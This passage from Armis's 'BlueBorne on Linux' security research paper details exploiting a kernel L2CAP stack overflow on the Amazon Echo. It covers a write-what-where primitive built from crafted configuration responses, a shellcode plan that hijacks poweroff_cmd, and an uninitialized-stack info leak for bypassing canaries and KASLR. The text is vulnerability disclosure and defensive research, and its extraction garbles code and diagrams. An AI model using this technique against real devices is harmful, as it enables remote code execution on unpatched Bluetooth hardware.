stackvars AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAtargetbuffer-req[64]AAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
stackvars ptr(stackvar)

savedregisters,savedframe,andreturnaddress

l2cap_recv_acldata

previousframe,stackvars

BlueBorne on Linux  |  © 2017 ARMIS  |  24

As noted before, unlike the case of the Samsung Gear S3 - it was apparent from this stack frame, that FORTIFY_SOURCE was not used when compiling this kernel - since the r eqbuffer is not allocated on the end of this stack frame. This means that overflowing this buffer will overwrite one of the additional stack variables allocated below it - before reaching the coveted return address. However, this also meant that new candidates for overflow exists in this build specifically the ptrvariable that is located just before the start of the functions' saved registers. This ptr is actually the pointer to the configuration request that is being built while parsing our crafted configuration response buffer:

staticintl2cap_parse_conf_rsp(structl2cap_chan*chan,void*rsp, intlen,void*data,u16*result)  { structl2cap_conf_req*req=data; void*ptr=req->data; //... while(len>=L2CAP_CONF_OPT_SIZE){ len-=l2cap_get_conf_opt(&rsp,&type,&olen,&val); switch(type){ ...
caseL2CAP_CONF_RFC: ... l2cap_add_conf_opt(&ptr,L2CAP_CONF_RFC,sizeof(rfc), (unsignedlong)&rfc); break; ...
Excerpt from l2cap_parse_conf_rsp (net/bluetooth/l2cap_core.c)
Each time l2cap_add_conf_opt is called, a configuration element is written to this ptr, and it is then incremented accordingly. So by overflowing p tr we could control where the next configuration element would be copied to. Seemed like the perfect candidate for a write-what-where primitive.
Developing Write-What-Where
Using the zero-length-RFC primitive we can now overflow the r eqbuffer and reach the ptr variable. However, a little more manipulation was needed:

DE08 req DE0C DE10 DE14

04

09

UC

UC

UC

UC

UC

UC

UC

UC

UC

04

09

UC

UC

UC

BlueBorne on Linux  |  © 2017 ARMIS  |  25

...

...

...

...

...

...

...

...

...

...

DEF8

UC

UC

04

09

DEFC

UC

UC

UC

UC

DF00

UC

UC

UC

UC

DF04 ptr

UC

04

09

XX

DF08

XX

XX

XX

XX

DF0C R4

XX

XX

XX

XX

l2cap_recv_framestack frame of the Amazon Echo
In the above stack frame illustration - XX bytes are attacker controlled 0409 are uncontrolled configuration element header bytes, and UC bytes are configuration element payload bytes, which are also uncontrolled bytes. This stack frame shows illustrates that sending 24 zero-length RFC elements will achieve to overflow the ptrvariable - but with uncontrolled bytes. To control the value of ptr we would need to align our overflow a bit:

... DEEC DEF0 DEF4 DEF8 DEFC DF00 DF04 ptr

...

...

...

...

UC

UC

UC

04

RFC#22

09

UC

UC

UC

UC

UC

UC

UC

UC

UC

02

02 FLUSH#1

UC

UC

02

02 FLUSH#2

UC

UC

02

02 FLUSH#3

XX

XX

--

--

By sending 22 zero-length RFC elements, and additional 2 zero-length FLUSH elements, we are able to overflow the lower 2 bytes of ptr with attacker controlled data (carried in an additional FLUSH#3 element - that will not be zero-length). Since the Echo is ARM little-endian, this allows us to move the ptr to almost anywhere in the stack, as the 2 higher bytes of it will be left untouched. Any additional configuration element placed after the 3rd FLUSH element will than be
BlueBorne on Linux  |  © 2017 ARMIS  |  26

written to the overflown ptr. Having spent 52 bytes of our configuration response budget (22*zero-length-RFCs + 2*zero-length-FLUSHs + 1-ptr-overflowing-FLUSH), we have 8 bytes of configuration elements to write to our chosen p tr. These elements still have to be valid configuration elements - but the FLUSH element (for example) isn't limited at all in value, but it will still be written with a prepended \x02\x02 bytes before each write. Despite all these limitations, we can send multiple write-what-where primitives as shown above, and achieve overflow of any stack variable we'd like. Lastly, L2CAP has another neat feature that we can abuse: Each L2CAP packet can hold multiple L2CAP commands (L2CAP_ConfigResp commands, for example). Putting multiple crafted write-what-where L2CAP configuration responses in one L2CAP messages allow us to abuse the stack before l2cap_recv_frame returns:
Wireshark screenshots of the crafted L2CAP message containing multiple configuration response commands
Defeating the side effect of the additional \x02\x02 bytes written before each write can be achieved by doing our writes in reverse order, so that only 2 extra bytes are left at the start of each consecutive write.
Putting it all together
Having developed a write-what-where primitive of the stack, and having no NX-bit in the Echo (!), our exploit can simply do the following steps:
BlueBorne on Linux  |  © 2017 ARMIS  |  27

 Send a crafted L2CAP packet with multiple ConfResp's:  Each ConfResp writes 2 bytes of payload to an unused area on the stack  The last 2 ConfResp's will point the LR to our payload on the stack
 The payload will be a shellcode that will perform the following:  Overwrite poweroff_cmd  with our desired bash redirection command  Call __orderly_poweroff(false) to run the powercoff_cmd  Restore execution
Case Study #n - Defeating modern mitigations
As demonstrated in the examples above, most IoT devices use little to no mitigations in their kernel builds. However, the majority of Linux distributions that are used in endpoints, servers and other applications uses some mitigations. The most common of them are stack protectors, and in rare cases, some might also enable KASLR in their builds. To defeat such mitigations, an information leak from the kernel's memory is needed.
A new information leak vulnerability in the kernel
Returning once again to the vulnerable l2cap_parse_conf_rsp function, we've spotted that the efs variable, allocated on stack, is uninitialized:
staticintl2cap_parse_conf_rsp(structl2cap_chan*chan,void*rsp,intlen, void*data,u16*result){ ... structl2cap_conf_efsefs;//<-Uninitialized ... while(len>=L2CAP_CONF_OPT_SIZE){ ... len-=l2cap_get_conf_opt(&rsp,&type,&olen,&val); ... switch(type){ caseL2CAP_CONF_EFS: if(olen==sizeof(efs)) memcpy(&efs,(void*)val,olen); ... l2cap_add_conf_opt(&ptr,L2CAP_CONF_EFS,sizeof(efs),
(unsignedlong)&efs); ...
Excerpt from l2cap_parse_conf_rsp (net/bluetooth/l2cap_core.c)
In the above code, olen is the size of the configuration element that is currently being parsed, and the highlighted ifverifies that the efselement would only be written with the received element's payload if the the size of that element is exactly the size of the efs struct. Regardless of
BlueBorne on Linux  |  © 2017 ARMIS  |  28

that if, the code will copy back the efs variable to the outgoing ConfigRequest message that is being built! This means that by simply sending a ConfigResponse message that contains a configuration element of type L2CAP_CONF_EFS, with any size other than s izeof(efs)(which is 16 bytes) - a configuration request message would be returned containing uninitialized data from the stack. A separate flow containing a similar flaw exists in the parsing of ConfigRequest messages (l2cap_parse_conf_req). In the screenshot below, we can see an example of this vulnerability being exploited against the Samsung Gear S3 device:
Wireshark capture showing the returned Configuration Request with an uninitialized EFS element
The 16 bytes of data in the EFS option above are actually uninitialized data from the stack, and in fact the last 8 bytes (highlighted in red) are some pointer to the code section, that was leaked from the uninitialized stack variable efs. It is important to note that manipulating the stack in such a way that allows bypassing of mitigations is not necessarily a simple task, since it requires the attacker to control which code flows precede the call to the vulnerable l2cap_parse_conf_reqfunction - and which will be responsible for what data will be left in the uninitialized bytes on stack to which efswould later be allocated. This will also be dependent on the specific kernel build and the specific code layout of that build. However, a determined attacker can find ways to shape the code flow to selectively leak data from the stack - including the stack protector itself, if used in the targeted device. In a similar manner, the leaked stack data may also include pointers to code (as in the above screenshot), data, or any other sections relevant to the attack. Using these pointers, an attacker can deduce the base addresses of the various sections, and bypass KASLR as well.
BlueBorne on Linux  |  © 2017 ARMIS  |  29

Conclusions
During our research into the Bluetooth stack and implementation, and the subsequent research aimed at exploiting consumer devices, several topics that we believe merit further attention surfaced. The Bluetooth specification, albeit being almost 3000 pages long, does not adequately detail many implementation aspects, creating considerable room for developer-interpretation. This opens the door for a great deal of potential pitfalls and developer errors to occur. In the case of the vulnerability discussed in this writeup, for instance, to prevent this implementation error from ever occurring, it would have sufficed for the standard to strictly specify that configuration elements cannot be duplicated. Despite the ample availability of mitigations and hardening features, most Linux based devices offer very little resistance to attacks like the one demonstrated above. An attacker exploiting a run-of-the-mill kernel stack overflow - certainly a very outdated vulnerability class - faces almost no obstacles in leveraging code execution. The complexity and therefore the cost of exploiting a simple kernel stack overflow is increased when features like KASLR and stack-canary protection are enabled, and with little to no disadvantages. Having said that - attackers would ultimately find ways to bypass mitigations, as we have shown in the case of the last information leak vulnerability we found. This means there is no substitute for properly auditing the code of Bluetooth implementations, and verifying they do not contain potentially devastating vulnerabilities.
BlueBorne on Linux  |  © 2017 ARMIS  |  30

